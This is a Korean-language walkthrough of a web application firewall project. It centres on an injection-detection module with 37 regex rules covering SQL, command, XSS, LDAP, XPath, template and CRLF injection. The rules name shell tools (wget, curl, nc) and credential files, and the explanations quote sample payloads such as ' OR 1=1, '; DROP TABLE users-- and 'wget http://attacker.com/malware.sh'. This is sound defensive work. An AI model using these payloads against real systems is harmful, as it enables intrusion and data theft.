from owasp.types import Finding, ModuleScanResult, RequestContext, Severity

Scan = Callable[[RequestContext], Awaitable[ModuleScanResult]]
```
→ `Scan` 타입 별칭: "RequestContext를 받아 `ModuleScanResult`를 반환하는 비동기 함수"의 타입.  
→ 각 모듈의 `scan()` 함수가 이 타입을 따라야 함 (인터페이스 강제).

```python
@dataclass(frozen=True, slots=True)
class OWASPModule:
    module_id: str   # "a05"
    owasp_id: str    # "A05:2025"
    title: str       # "Injection"
    scan: Scan       # scan() 함수 자체를 필드로 저장 (일급 함수)
```
→ 하나의 OWASP 모듈의 메타데이터와 스캔 함수를 묶은 레코드.  
→ `scan: Scan`: Python에서 함수도 객체이므로 필드에 저장 가능.

```python
MODULES: tuple[OWASPModule, ...] = (
    OWASPModule(a01.MODULE_ID, a01.OWASP_ID, a01.TITLE, a01.scan),
    OWASPModule(a02.MODULE_ID, a02.OWASP_ID, a02.TITLE, a02.scan),
    ...
    OWASPModule(a05.MODULE_ID, a05.OWASP_ID, a05.TITLE, a05.scan),
    ...
    OWASPModule(a10.MODULE_ID, a10.OWASP_ID, a10.TITLE, a10.scan),
)
```
→ 10개 모듈이 등록된 불변 튜플. `detector.py`에서 이 튜플을 순회하며 스캔 실행.  
→ 새 모듈 추가 시 여기에 한 줄만 추가하면 자동으로 스캔 파이프라인에 포함됨.

---

### 4.3 `owasp/a01.py` ~ `a04.py`, `a06.py` ~ `a10.py` (스켈레톤 모듈)

9개의 스켈레톤 모듈은 모두 동일한 구조를 가진다:

```python
"""A01:2025 — Broken Access Control (skeleton)."""

from __future__ import annotations
from owasp.types import ModuleScanResult, RequestContext, clean_result

OWASP_ID = "A01:2025"
MODULE_ID = "a01"
TITLE = "Broken Access Control"


async def scan(ctx: RequestContext) -> ModuleScanResult:
    _ = ctx
    return clean_result(module_id=MODULE_ID, owasp_id=OWASP_ID)
```

→ `_ = ctx`: `ctx` 인자를 쓰지 않아 "unused variable" 경고가 나오지 않도록 하는 컨벤션.  
→ `return clean_result(...)`: Finding이 없는 빈 결과 반환. 탐지 로직 미구현.  
→ 스켈레톤인 이유: 현재 A05만 완전 구현. 나머지는 향후 구현 예정.

각 모듈의 OWASP ID와 제목:

| 파일 | OWASP_ID | TITLE |
|---|---|---|
| `a01.py` | A01:2025 | Broken Access Control |
| `a02.py` | A02:2025 | Cryptographic Failures |
| `a03.py` | A03:2025 | Injection (구버전 분류) |
| `a04.py` | A04:2025 | Insecure Design |
| `a06.py` | A06:2025 | Vulnerable and Outdated Components |
| `a07.py` | A07:2025 | Identification and Authentication Failures |
| `a08.py` | A08:2025 | Software and Data Integrity Failures |
| `a09.py` | A09:2025 | Security Logging and Monitoring Failures |
| `a10.py` | A10:2025 | Server-Side Request Forgery (SSRF) |

---

### 4.4 `owasp/a05.py` — 가장 핵심 파일

> **역할:** A05:2025 Injection 탐지 모듈. SQL, OS Command, XSS, LDAP, XPath, SSTI, CRLF 등 7종 인젝션을 37개 규칙으로 탐지하고, 탐지 시 HTML 차단 페이지를 생성한다.

#### 파일 헤더 (1~19줄)

```python
"""A05:2025 — Injection

프록시 레이어에서 업스트림 전달 전에 탐지한다.
검사 대상: URL 경로, 쿼리스트링, 요청 바디(미리보기), 주요 헤더
탐지 유형: SQL Injection, OS Command Injection, XSS,
           LDAP/XPath Injection, Expression Language Injection, CRLF Injection
"""

from __future__ import annotations
import re
import urllib.parse
from dataclasses import dataclass
from typing import Sequence

from owasp.types import Finding, ModuleScanResult, RequestContext, Severity

OWASP_ID = "A05:2025"
MODULE_ID = "a05"
TITLE = "Injection"
```
→ `re`: 정규식 엔진. 탐지 규칙이 모두 정규식 패턴.  
→ `urllib.parse`: URL 디코딩 (`%27` → `'`)에 사용. URL 인코딩 우회 대응.  
→ `Sequence`: `list`, `tuple` 모두를 받을 수 있는 추상 타입 힌트 (deque도 포함).

---

#### 스캔 대상 헤더 (25~35줄)

```python
_SCANNABLE_HEADERS = {
    "user-agent",
    "referer",
    "cookie",
    "x-forwarded-for",
    "x-real-ip",
    "x-custom-header",
    "accept-language",
    "origin",
    "content-type",
}
```
→ 인젝션 페이로드가 삽입될 수 있는 HTTP 헤더 목록.  
→ 왜 모든 헤더가 아닌가? → 성능 최적화. `Authorization`, `Content-Length` 같은 헤더는 인젝션 공격 벡터로 사용되지 않음.  
→ `User-Agent`: 일부 웹앱은 UA를 DB에 저장하므로 SQL Injection 경로가 됨.  
→ `Cookie`: 세션 ID 외에 사용자 설정값을 담는 경우가 있어 인젝션 가능.  
→ `Referer`: URL 일부를 그대로 DB에 저장하는 앱에서 취약점 발생.

---

#### 규칙 정의 구조 (41~55줄)

```python
@dataclass(frozen=True, slots=True)
class _Rule:
    rule_id: str
    pattern: re.Pattern[str]
    severity: Severity
    description: str


def _r(rule_id: str, pattern: str, severity: Severity, description: str) -> _Rule:
    return _Rule(
        rule_id=rule_id,
        pattern=re.compile(pattern, re.IGNORECASE | re.DOTALL),
        severity=severity,
        description=description,
    )
```
→ `_Rule`: 개별 탐지 규칙을 표현하는 데이터클래스. `_` 접두사는 모듈 외부에서 직접 사용하지 않는 내부 클래스.  
→ `_r()`: `_Rule` 생성의 편의 팩토리 함수. 규칙 선언을 한 줄로 간결하게 표현.  
→ `re.IGNORECASE`: 대소문자 구분 없이 탐지. `SELECT`, `select`, `SeLeCt` 모두 탐지.  
→ `re.DOTALL`: `.`이 줄바꿈 문자(`\n`)도 매칭. 멀티라인 페이로드 탐지 가능.

---

#### SQL Injection 규칙 (60~96줄) — 9개 규칙

```python
_r("A05-SQL-001", r"'\s*(OR|AND)\s+[\w'\"]+\s*=\s*[\w'\"]+",
   Severity.CRITICAL, "SQL 인증 우회 (OR/AND 조건)"),
```
→ **규칙 ID:** A05-SQL-001  
→ **패턴 해설:** 작은따옴표(`'`) 뒤에 공백이 있고, `OR` 또는 `AND` 뒤에 `1=1`, `'a'='a'` 같은 항상 참인 조건.  
→ **탐지 예:** `' OR 1=1`, `' OR 'a'='a'`, `' AND 1=1--`  
→ **심각도: CRITICAL** — 인증 우회에 직접 사용되는 패턴.

```python
_r("A05-SQL-002", r"';\s*(DROP|DELETE|INSERT|UPDATE|CREATE|ALTER|EXEC|EXECUTE)\b",
   Severity.CRITICAL, "SQL 구문 종료 후 DDL/DML 삽입"),
```
→ **탐지 예:** `'; DROP TABLE users--`, `'; DELETE FROM orders`  
→ 세미콜론(`;`)으로 현재 쿼리를 종료하고 새 DDL/DML 쿼리를 삽입.  
→ `\b`: 단어 경계. `DROPS`처럼 긴 단어에서 오탐 방지.

```python
_r("A05-SQL-003", r"\bUNION\b\s+(ALL\s+)?\bSELECT\b",
   Severity.CRITICAL, "UNION SELECT 기반 데이터 추출"),
```
→ **탐지 예:** `' UNION SELECT username,password FROM users--`  
→ UNION-based SQL Injection: 원래 쿼리 결과에 공격자가 원하는 데이터를 추가.

```python
_r("A05-SQL-004", r"(--[ \t]|--$|#\s*$|/\*[\s\S]*?\*/)",
   Severity.HIGH, "SQL 주석을 이용한 우회"),
```
→ **탐지 예:** `--` (MySQL/MSSQL 주석), `#` (MySQL 주석), `/* ... */` (블록 주석)  
→ 주석으로 쿼리 뒷부분을 무력화: `admin'--` → `SELECT * FROM users WHERE id='admin'--'`.

```python
_r("A05-SQL-005", r"\b(SLEEP|BENCHMARK|PG_SLEEP|WAITFOR\s+DELAY)\s*\(",
   Severity.CRITICAL, "Time-based Blind SQL Injection"),
```
→ **탐지 예:** `SLEEP(5)` (MySQL), `PG_SLEEP(5)` (PostgreSQL), `WAITFOR DELAY '0:0:5'` (MSSQL)  
→ Blind SQLi: 응답 지연으로 취약점 존재 확인.

```python
_r("A05-SQL-006", r"\b(EXTRACTVALUE|UPDATEXML|EXP|FLOOR\s*\(RAND)\s*\(",
   Severity.HIGH, "Error-based Blind SQL Injection"),
```
→ **탐지 예:** `EXTRACTVALUE(1, ...)` (MySQL), `UPDATEXML(...)` (MySQL)  
→ DB 오류 메시지를 통해 데이터 추출.

```python
_r("A05-SQL-007", r"\b(XP_CMDSHELL|SP_EXECUTESQL|SP_MAKEWEBTASK|OPENROWSET)\b",
   Severity.CRITICAL, "MSSQL 시스템 함수 호출"),
```
→ MSSQL 전용 위험 시스템 함수. `XP_CMDSHELL`은 SQL에서 OS 명령을 실행.

```python
_r("A05-SQL-008", r";\s*(SELECT|INSERT|UPDATE|DELETE|DROP|CREATE)\b",
   Severity.HIGH, "Stacked Query (세미콜론 이후 추가 쿼리)"),
```
→ **탐지 예:** `1; SELECT @@version`  
→ Stacked Query: PHP+MySQL 등에서 복수 쿼리 실행 가능한 환경.

```python
_r("A05-SQL-009", r"0x[0-9a-fA-F]{4,}",
   Severity.MEDIUM, "SQL 16진수 인코딩 우회"),
```
→ **탐지 예:** `0x41646d696e` (= 'Admin'의 16진수)  
→ 문자열 필터 우회: `'admin'` 대신 `0x61646d696e` 형태로 입력.

---

#### OS Command Injection 규칙 (100~125줄) — 6개 규칙

```python
_r("A05-CMD-001",
   r"[;&|`]\s*(cat|ls|id|whoami|uname|pwd|env|printenv|wget|curl|nc|bash|sh|python|perl|ruby)\b",
   Severity.CRITICAL, "명령어 체인을 통한 OS 명령 실행"),
```
→ **탐지 예:** `127.0.0.1; cat /etc/passwd`, `127.0.0.1 | whoami`  
→ `;`, `&`, `|`, `` ` `` 뒤에 위험 명령어가 오는 패턴.  
→ `[;&|`]`: 명령어 체인 연산자 집합.

```python
_r("A05-CMD-002", r"\$\([^)]{1,200}\)",
   Severity.CRITICAL, "서브쉘 치환 $() 를 통한 명령 실행"),
```
→ **탐지 예:** `$(whoami)`, `$(cat /etc/passwd)`  
→ Shell 서브쉘 치환. 백틱과 동일 기능.

```python
_r("A05-CMD-003", r"`[^`]{1,200}`",
   Severity.CRITICAL, "백틱을 이용한 명령 실행"),
```
→ **탐지 예:** `` `whoami` ``, `` `cat /etc/shadow` ``  
→ 백틱 안의 명령이 실행되어 결과로 치환.

```python
_r("A05-CMD-004", r"(/bin/|/usr/bin/|/etc/)(bash|sh|cat|rm|chmod|chown|wget|curl)",
   Severity.CRITICAL, "절대경로 실행 파일 참조"),
```
→ **탐지 예:** `/bin/bash -c "id"`, `/usr/bin/wget http://attacker.com`  
→ 절대 경로로 실행 파일 참조 → 환경 변수 PATH 조작 없이 실행 가능.

```python
_r("A05-CMD-005", r"/etc/(passwd|shadow|hosts|crontab|sudoers)",
   Severity.HIGH, "민감한 시스템 파일 접근 시도"),
```
→ Linux 주요 민감 파일 경로. 정보 수집 공격.

```python
_r("A05-CMD-006", r"(wget|curl)\s+.{0,100}(http|ftp)://",
   Severity.HIGH, "wget/curl 을 통한 외부 통신 시도"),
```
→ **탐지 예:** `wget http://attacker.com/malware.sh`  
→ 외부 서버에서 악성 파일 다운로드 시도.

---

#### XSS 규칙 (129~165줄) — 9개 규칙

```python
_r("A05-XSS-001", r"<script[\s>]", Severity.HIGH, "XSS: <script> 태그 삽입"),
```
→ **탐지 예:** `<script>alert(1)</script>`, `<script src="evil.js">`  
→ 가장 기본적인 XSS. `[\s>]`로 `<script>` 또는 `<script ` 형태 모두 탐지.

```python
_r("A05-XSS-002", r"javascript\s*:", Severity.HIGH, "XSS: javascript: URL 스킴"),
```
→ **탐지 예:** `<a href="javascript:alert(1)">`, `<img src="javascript:void(0)">`

```python
_r("A05-XSS-003",
   r"on(load|error|click|mouseover|focus|blur|submit|keyup|keydown|change|input)\s*=",
   Severity.HIGH, "XSS: 인라인 이벤트 핸들러"),
```
→ **탐지 예:** `<img onerror="alert(1)">`, `<div onload="evil()">`

```python
_r("A05-XSS-004", r"<iframe[\s>]", Severity.HIGH, "XSS: <iframe> 태그 삽입"),
```
→ iframe으로 악성 페이지를 현재 도메인 컨텍스트에서 로드.

```python
_r("A05-XSS-005", r"document\.(cookie|location|write|writeln)",
   Severity.HIGH, "XSS: DOM 조작을 통한 쿠키 탈취 또는 리다이렉트"),
```
→ **탐지 예:** `<script>document.cookie</script>` — 세션 쿠키 탈취.  
→ `document.location = "http://attacker.com"` — 강제 리다이렉트.

```python
_r("A05-XSS-006", r"\beval\s*\(", Severity.HIGH, "XSS: eval() 를 통한 코드 실행"),
```
→ `eval()`: 문자열을 JavaScript로 실행. Base64 인코딩 우회에 자주 사용.  
→ **탐지 예:** `eval(atob("YWxlcnQoMSk="))` — Base64로 인코딩된 코드 실행.

```python
_r("A05-XSS-007", r"<(img|svg|body|input)[^>]*onerror\s*=",
   Severity.HIGH, "XSS: onerror 이벤트를 통한 스크립트 실행"),
```
→ **탐지 예:** `<img src="x" onerror="alert(1)">`  
→ 이미지 로드 실패 시 onerror 이벤트 트리거.

```python
_r("A05-XSS-008", r"expression\s*\(", Severity.MEDIUM, "XSS: CSS expression() 실행"),
```
→ IE(Internet Explorer) 전용 CSS 취약점. 레거시 시스템 테스트에 유용.

```python
_r("A05-XSS-009", r"&#[xX]?[0-9a-fA-F]{2,6};",
   Severity.MEDIUM, "XSS: HTML 문자 인코딩 우회"),
```
→ **탐지 예:** `&#x3C;script&#x3E;` → `<script>` 로 디코딩됨.  
→ WAF 우회 기법 중 하나.

---

#### LDAP Injection 규칙 (169~178줄) — 3개 규칙

```python
_r("A05-LDAP-001", r"\)\s*\(\s*[|&]", Severity.HIGH, "LDAP 필터 조작 (OR/AND 연산자 삽입)"),
_r("A05-LDAP-002", r"\*\)\s*\(", Severity.HIGH, "LDAP 와일드카드를 이용한 인증 우회"),
_r("A05-LDAP-003", r"\(\s*(uid|cn|sn|mail|ou|dc|objectClass)\s*=\s*\*",
   Severity.HIGH, "LDAP 속성 와일드카드 검색"),
```
→ LDAP 쿼리 필터를 조작하는 패턴. Active Directory 인증 시스템 공격에 사용.  
→ **탐지 예:** `*)(&` → LDAP 필터 `(uid=admin*)(&...)` 형태로 인증 우회.

---

#### XPath Injection 규칙 (183~191줄) — 3개 규칙

```python
_r("A05-XPATH-001", r"'\s*or\s*'[\w\d]+'\s*=\s*'[\w\d]+",
   Severity.HIGH, "XPath 인젝션: OR 조건"),
_r("A05-XPATH-002", r"(//|\.\./|/\.\./)", Severity.MEDIUM, "XPath 노드 순회 시도"),
_r("A05-XPATH-003", r"\bstring-length\s*\(|\bsubstring\s*\(|\bcount\s*\(",
   Severity.MEDIUM, "XPath Blind 인젝션 함수 사용"),
```
→ XML 데이터베이스에 대한 XPath 쿼리 인젝션.  
→ `//`: XPath 전체 경로 순회 → 모든 노드 접근 가능.  
→ `string-length()`, `substring()`: Blind XPath Injection 시 데이터를 한 글자씩 추출.

---

#### Expression Language / SSTI 규칙 (195~213줄) — 5개 규칙

```python
_r("A05-EL-001", r"\$\{\s*[^}]{1,200}\}", Severity.HIGH, "EL 인젝션: ${...}"),
_r("A05-EL-002", r"#\{\s*[^}]{1,200}\}", Severity.HIGH, "EL 인젝션: #{...}"),
_r("A05-EL-003", r"%\{[^}]{1,200}\}", Severity.HIGH, "OGNL 인젝션: %{...}"),
_r("A05-SSTI-001", r"\{\{[\s\S]{1,200}\}\}", Severity.HIGH,
   "SSTI: Jinja2/Twig/Handlebars 템플릿 인젝션"),
_r("A05-SSTI-002", r"\{%[\s\S]{1,200}%\}", Severity.HIGH, "SSTI: Jinja2 블록 태그 인젝션"),
```
→ `${...}`: Spring EL, Thymeleaf, Java EE EL.  
→ `#{...}`: JSF(JavaServer Faces) EL.  
→ `%{...}`: OGNL (Apache Struts 2 취약점 CVE-2017-5638 등).  
→ `{{...}}`: **SSTI** (Server-Side Template Injection) — Jinja2(`{{7*7}}`→`49`), Twig, Handlebars.  
→ `{%...%}`: Jinja2 블록 태그 (`{% for x in ... %}` 등으로 서버 데이터 접근).

---

#### CRLF Injection 규칙 (217~223줄) — 2개 규칙

```python
_r("A05-CRLF-001", r"(%0d%0a|%0D%0A|\r\n|\n)",
   Severity.MEDIUM, "CRLF 인젝션: HTTP 헤더 분할 시도"),
_r("A05-CRLF-002", r"(%0a|%0d)(Set-Cookie|Location|Content-Type)",
   Severity.HIGH, "CRLF 인젝션: HTTP 응답 헤더 조작"),
```
→ `\r\n`(CRLF): HTTP 헤더 구분자. URL에 삽입하면 가짜 헤더를 주입할 수 있음.  
→ **A05-CRLF-001**: 줄바꿈 문자가 있으면 경고 (MEDIUM).  
→ **A05-CRLF-002**: 줄바꿈 후 `Set-Cookie`, `Location` 같은 헤더가 오면 실제 헤더 조작 (HIGH).  
→ **공격 예:** `http://victim.com/redirect?url=http://evil.com%0d%0aSet-Cookie:session=evil` → 피해자 브라우저에 악성 쿠키 심기.

---

#### 규칙 통합 (226~234줄)

```python
_ALL_RULES: tuple[_Rule, ...] = (
    *_SQL_RULES,
    *_CMD_RULES,
    *_XSS_RULES,
    *_LDAP_RULES,
    *_XPATH_RULES,
    *_EL_RULES,
    *_CRLF_RULES,
)
```
→ 7개 카테고리 규칙 세트를 하나의 튜플로 통합.  
→ `*` 언패킹으로 각 규칙 세트의 요소를 펼쳐서 합침.  
→ 총 37개 규칙: SQL(9) + CMD(6) + XSS(9) + LDAP(3) + XPath(3) + EL/SSTI(5) + CRLF(2).

---

#### 디코딩 헬퍼 (240~261줄)

```python
def _decode_layers(value: str) -> list[str]:
    """원본, URL 디코드 1회, URL 디코드 2회(이중 인코딩) 를 모두 반환."""
    variants: list[str] = [value]
    try:
        d1 = urllib.parse.unquote(value)
        if d1 != value:
            variants.append(d1)
        d2 = urllib.parse.unquote(d1)
        if d2 != d1:
            variants.append(d2)
    except Exception:
        pass
    return variants
```
→ **URL 인코딩 우회 대응:** 공격자가 `%27 OR 1=1` (`'` → `%27`)처럼 인코딩하면 원시 값만 검사하면 탐지 불가.  
→ `urllib.parse.unquote("%27")` → `"'"` 디코딩.  
→ 1회 디코딩 + 2회 디코딩(이중 인코딩 `%2527` → `%27` → `'`) 모두 검사.  
→ `if d1 != value:`: 변화가 없으면 중복 추가 방지.

```python
def _decode_plus(value: str) -> list[str]:
    """쿼리스트링에서 + → 공백 치환 포함."""
    variants = _decode_layers(value)
    plus = value.replace("+", " ")
    if plus not in variants:
        variants.extend(_decode_layers(plus))
    return variants
```
→ 쿼리스트링에서 `+`는 공백을 의미. `q=SELECT+*+FROM+users` → `SELECT * FROM users`.  
→ 경로나 헤더에서는 `+`가 리터럴이므로 `_decode_layers`만 사용하고, 쿼리/폼에서는 `_decode_plus` 사용.

---

#### 핵심 스캔 함수들 (267~334줄)

```python
def _scan_value(value: str, *, plus_decode: bool = False) -> list[Finding]:
    """단일 문자열 값에 대해 모든 규칙을 적용하고 Finding 목록을 반환."""
    findings: list[Finding] = []
    variants = _decode_plus(value) if plus_decode else _decode_layers(value)

    for rule in _ALL_RULES:
        for variant in variants:
            m = rule.pattern.search(variant)
            if m:
                matched_text = m.group(0)[:200]
                findings.append(
                    Finding(
                        rule_id=rule.rule_id,
                        evidence=f"{rule.description} | 탐지값: {matched_text!r}",
                        severity=rule.severity,
                    )
                )
                break  # 같은 규칙은 variant별로 중복 탐지 방지

    return findings
```
→ 단일 문자열에 37개 규칙을 모두 적용.  
→ 각 규칙에 대해 원본, 1회 디코딩, 2회 디코딩 값을 순서대로 시도.  
→ `m.group(0)[:200]`: 매칭된 텍스트를 최대 200자로 자름 (증거 문자열이 너무 길면 잘라냄).  
→ `{matched_text!r}`: 매칭된 값을 repr 형식(따옴표 포함)으로 표현. `' OR 1=1` → `"' OR 1=1"`.  
→ `break`: 한 규칙에서 variant 하나만 매칭되면 충분. 같은 규칙으로 여러 variant에서 중복 Finding 방지.

```python
def _collect_targets(ctx: RequestContext) -> list[tuple[str, str]]:
    """(label, value) 쌍 목록 — 스캔 대상 전체 추출."""
    targets: list[tuple[str, str]] = []

    # URL 경로
    targets.append(("path", ctx.path))

    # 쿼리스트링 전체 + 파라미터별
    if ctx.query_string:
        targets.append(("query_raw", ctx.query_string))
        try:
            parsed = urllib.parse.parse_qs(ctx.query_string, keep_blank_values=True)
            for key, values in parsed.items():
                targets.append((f"query.{key}", key))  # 파라미터 키도 스캔
                for v in values:
                    targets.append((f"query.{key}", v))
        except Exception:
            pass

    # 요청 바디 미리보기
    if ctx.body_preview:
        targets.append(("body", ctx.body_preview))
        # JSON 바디
        try:
            import json
            obj = json.loads(ctx.body_preview)
            for k, v in _flatten_json(obj):
                targets.append((f"body.{k}", str(v)))
        except Exception:
            pass
        # URL-encoded 폼 바디
        try:
            if "application/x-www-form-urlencoded" in ctx.headers.get("content-type", ""):
                parsed_body = urllib.parse.parse_qs(ctx.body_preview, keep_blank_values=True)
                for key, values in parsed_body.items():
                    for v in values:
                        targets.append((f"form.{key}", v))
        except Exception:
            pass

    # 헤더 값
    for header_name, header_value in ctx.headers.items():
        if header_name.lower() in _SCANNABLE_HEADERS:
            targets.append((f"header.{header_name}", header_value))

    return targets
```
→ 요청의 모든 부분에서 스캔할 값을 추출하는 함수.  
→ **스캔 커버리지 전략:**
  - `path`: 경로 순회 공격(Path Traversal) 포함 가능.
  - `query_raw`: 전체 쿼리스트링. `?q=<script>` 같은 경우 파싱 전에도 탐지.
  - `query.{key}`: 개별 파라미터 값.
  - `body`: 전체 바디 미리보기.
  - `body.{key}`: JSON 바디의 각 필드 값.
  - `form.{key}`: URL-encoded 폼 필드 값.
  - `header.{name}`: 주요 헤더 값.
→ `try/except` 블록: JSON 파싱 실패, URL 파싱 실패 등 예외가 발생해도 스캔을 계속.

---

#### JSON 평탄화 (337~350줄)

```python
def _flatten_json(obj: object, prefix: str = "") -> list[tuple[str, object]]:
    """JSON 객체를 재귀적으로 펼쳐 (경로, 값) 쌍을 반환."""
    items: list[tuple[str, object]] = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            new_key = f"{prefix}.{k}" if prefix else str(k)
            items.extend(_flatten_json(v, new_key))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            new_key = f"{prefix}[{i}]"
            items.extend(_flatten_json(v, new_key))
    else:
        items.append((prefix, obj))
    return items
```
→ 중첩된 JSON을 평탄화하여 모든 리프(leaf) 값을 추출.  
→ **예시:**
  ```json
  {"user": {"name": "admin", "roles": ["admin", "user"]}}
  ```
  → `[("user.name", "admin"), ("user.roles[0]", "admin"), ("user.roles[1]", "user")]`
→ 중첩 JSON 안에 숨겨진 인젝션 페이로드도 탐지 가능.

---

#### 중복 제거 (353~361줄)

```python
def _deduplicate(findings: Sequence[Finding]) -> tuple[Finding, ...]:
    """동일 rule_id 는 첫 번째 Finding 만 유지."""
    seen: set[str] = set()
    result: list[Finding] = []
    for f in findings:
        if f.rule_id not in seen:
            seen.add(f.rule_id)
            result.append(f)
    return tuple(result)
```
→ 같은 규칙이 여러 입력에서 탐지될 때 중복 제거. 예: 쿼리와 바디 모두에서 `A05-SQL-001`이 탐지되면 첫 번째만 유지.  
→ `set[str]`로 O(1) 중복 확인.  
→ 결과를 `tuple`로 반환: `ModuleScanResult.findings`의 타입 `tuple[Finding, ...]` 충족.

---

#### 차단 HTML 페이지 생성 (363~530줄)

```python
_RULE_TYPE_MAP: dict[str, str] = {
    "A05-SQL":   "SQL Injection",
    "A05-CMD":   "OS Command Injection",
    "A05-XSS":   "XSS (크로스 사이트 스크립팅)",
    "A05-LDAP":  "LDAP Injection",
    "A05-XPATH": "XPath Injection",
    "A05-SSTI":  "SSTI / EL Injection",
    "A05-CRLF":  "CRLF Injection",
}
```
→ rule_id의 접두사(prefix)로 인젝션 유형 이름을 결정.  
→ 예: `A05-SQL-001` → 접두사 `A05-SQL` → `"SQL Injection"`.

```python
_SEV_RANK: dict[Severity, int] = {
    Severity.CRITICAL: 5, Severity.HIGH: 4,
    Severity.MEDIUM: 3, Severity.LOW: 2, Severity.NONE: 1,
}
```
→ 심각도별 정렬 우선순위. 차단 페이지에서 CRITICAL → HIGH 순으로 표시.

```python
_TITLE_MAP: dict[str, str] = {
    "SQL Injection": "SQL Injection 공격이 차단되었습니다",
    "XSS (크로스 사이트 스크립팅)": "XSS 공격이 차단되었습니다",
    ...
}
```
→ 인젝션 유형별 한국어 차단 제목 매핑.

```python
_BLOCK_PAGE_CSS = """...(인라인 CSS)..."""
```
→ 차단 페이지의 다크 테마 CSS를 문자열로 저장.  
→ 외부 CSS 파일 의존 없이 완전 독립적인 HTML 생성 (프록시 차단 시 CSS 요청이 업스트림으로 가지 않으므로).

```python
def _html_esc(s: str) -> str:
    return (
        s.replace("&", "&amp;")
         .replace("<", "&lt;")
         .replace(">", "&gt;")
         .replace('"', "&quot;")
    )
```
→ HTML 특수문자 이스케이프. 탐지된 페이로드(`<script>alert(1)</script>`)를 그대로 HTML에 출력하면 XSS 발생!  
→ 차단 페이지 자체가 XSS에 취약해지는 역설적 상황 방지.

```python
def _infer_injection_type(findings: tuple[Finding, ...]) -> str:
    sorted_f = sorted(findings, key=lambda f: _SEV_RANK.get(f.severity, 0), reverse=True)
    for f in sorted_f:
        for prefix, name in _RULE_TYPE_MAP.items():
            if f.rule_id.startswith(prefix):
                return name
    return "Injection"
```
→ 가장 심각한 Finding의 유형을 제목에 표시.  
→ 심각도 내림차순 정렬 후 첫 번째 Finding의 rule_id 접두사로 유형 결정.

```python
def make_block_html(findings: tuple[Finding, ...]) -> str:
    """차단된 요청에 대한 HTML 블록 페이지를 생성한다."""
    injection_type = _infer_injection_type(findings)
    title = _TITLE_MAP.get(injection_type, "Injection 공격이 차단되었습니다")

    sorted_findings = sorted(findings, key=lambda f: _SEV_RANK.get(f.severity, 0), reverse=True)
    rows = []
    for f in sorted_findings:
        label, css = _SEV_CSS.get(f.severity, ("?", "sev-low"))
        ev = f.evidence[:130] + "…" if len(f.evidence) > 130 else f.evidence
        rows.append(
            f'<div class="finding-row">...'
        )
    findings_html = "\n".join(rows)

    return f"""<!DOCTYPE html>..."""
```
→ Finding 목록을 HTML 테이블 형태로 렌더링.  
→ 증거 130자 제한: 페이로드가 매우 길어도 화면이 깨지지 않도록.
→ 반환된 HTML 문자열은 `main.py`의 `HTMLResponse(content=..., status_code=403)`으로 포장되어 브라우저에 전달.

---

#### `scan()` — 공개 진입점 (543~557줄)

```python
async def scan(ctx: RequestContext) -> ModuleScanResult:
    """A05:2025 Injection — 요청의 모든 입력값을 검사하여 인젝션 패턴을 탐지한다."""
    all_findings: list[Finding] = []

    for label, value in _collect_targets(ctx):
        plus = label.startswith("query") or label.startswith("form")
        findings = _scan_value(value, plus_decode=plus)
        all_findings.extend(findings)

    return ModuleScanResult(
        module_id=MODULE_ID,
        owasp_id=OWASP_ID,
        findings=_deduplicate(all_findings),
    )
```
→ `detector.py`가 호출하는 유일한 공개 함수.  
→ `_collect_targets()` → 스캔 대상 (label, value) 목록 추출.  
→ 각 타겟에 대해 `_scan_value()` 호출. `query.*`나 `form.*` 레이블이면 `plus_decode=True`.  
→ 모든 Finding을 `all_findings`에 누적.  
→ `_deduplicate()` → 중복 rule_id 제거.  
→ `ModuleScanResult` 반환.

**`scan()` 함수가 `async`인 이유:**  
현재는 순수 CPU 작업이지만, 향후 LLM API 호출, DB 블랙리스트 조회 등 비동기 I/O 작업이 추가될 수 있어 async로 미리 정의.

---

## 5. `templates/`

---

### 5.1 `templates/dashboard.html`

> **역할:** WAF 대시보드의 HTML 구조 정의. Jinja2 템플릿으로 서버 데이터를 초기 삽입.

```html
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>WAF 대시보드</title>
  <meta name="color-scheme" content="dark" />
  <link rel="stylesheet" href="/__waf/static/css/dashboard.css" />
</head>
```
→ `lang="ko"`: 스크린리더, 번역 도구에 한국어 페이지임을 알림.  
→ `color-scheme: dark`: 브라우저 기본 UI(스크롤바, 폼 요소)도 다크 모드로.  
→ CSS는 `/__waf/static/` 경로에서 서빙. `<head>`에 위치하여 렌더링 차단 없이 로드.

```html
<script type="application/json" id="waf-boot-data">{{ boot | tojson }}</script>
```
→ Jinja2의 `tojson` 필터: Python 딕셔너리를 JSON 문자열로 직렬화.  
→ `<script type="application/json">`: 브라우저가 JS로 실행하지 않고 데이터로 취급.  
→ JavaScript에서 `JSON.parse(document.getElementById("waf-boot-data").textContent)`로 초기 데이터 읽음.  
→ 이 패턴의 장점: 페이지 로드와 동시에 데이터 표시 → API 콜 전 빈 화면 방지.

**카드 섹션들:**
- **업스트림 카드:** `{{ upstream }}` Jinja2 변수로 업스트림 URL 표시.
- **연결 카드:** JS가 `upstream-status` ID로 동적 업데이트.
- **WAF 카드:** `waf-enabled` ID로 ON/OFF 표시.
- **차단 심각도 카드:** 현재 정책 표시.
- **A05 테스트 패널:** HTTP method, path, query, body 입력 → `/__waf/api/scan/a05` 호출.
- **접속자 카드:** IP별 접속 현황 테이블.
- **프록시 로그 카드:** 최근 200개 요청 실시간 피드.

**A05 프리셋 버튼 예시:**
```html
<button type="button" class="a05-preset-btn"
        data-query="q=' OR '1'='1--" data-body="">SQL Injection</button>
```
→ 버튼 클릭 시 JS가 `data-query`, `data-body`를 입력 필드에 채워줌.  
→ 빠른 테스트를 위한 UX 개선.

---

## 6. `static/waf/`

---

### 6.1 `static/waf/css/dashboard.css`

> **역할:** 대시보드의 시각적 스타일 정의. 글래스모피즘 디자인, 다크 테마.

**CSS 변수 (1~17줄):**
```css
:root {
  --bg-deep: #0a0e17;       /* 최심층 배경 */
  --bg-mid: #0f1420;        /* 중간 배경 */
  --glass: rgba(22, 28, 45, 0.55);   /* 글래스 효과 배경 */
  --glass-border: rgba(255, 255, 255, 0.08); /* 유리 테두리 */
  --text: #f0f4fc;           /* 주 텍스트 */
  --text-dim: #8b9cc4;       /* 보조 텍스트 */
  --gradient-start: #3b82f6; /* 파란색 (Tailwind blue-500) */
  --gradient-mid: #6366f1;   /* 인디고 (indigo-500) */
  --gradient-end: #a855f7;   /* 퍼플 (purple-500) */
